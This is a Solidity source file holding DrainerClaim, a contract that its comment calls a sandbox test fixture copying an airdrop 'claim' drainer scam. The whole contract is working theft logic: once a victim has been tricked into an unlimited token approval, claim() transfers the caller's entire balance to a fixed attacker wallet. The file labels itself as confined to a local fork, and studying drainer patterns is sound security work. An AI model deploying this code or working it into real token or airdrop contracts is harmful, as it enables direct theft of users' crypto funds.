// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/// @notice Models a real-world "claim your airdrop" drainer pattern for the
/// sandbox: the victim is tricked into an unlimited approve() on a token
/// (thinking it enables the claim), then calling claim() actually drains
/// their full balance to the attacker wallet instead of paying out anything.
/// This is a deliberately malicious test fixture confined to the local
/// fork — never deployed anywhere with real value.
contract DrainerClaim {
    address public immutable attackerWallet;

    constructor(address _attackerWallet) {
        attackerWallet = _attackerWallet;
    }

    function claim(address token) external {
        IERC20Like t = IERC20Like(token);
        uint256 balance = t.balanceOf(msg.sender);
        require(balance > 0, "nothing to claim");
        t.transferFrom(msg.sender, attackerWallet, balance);
    }
}
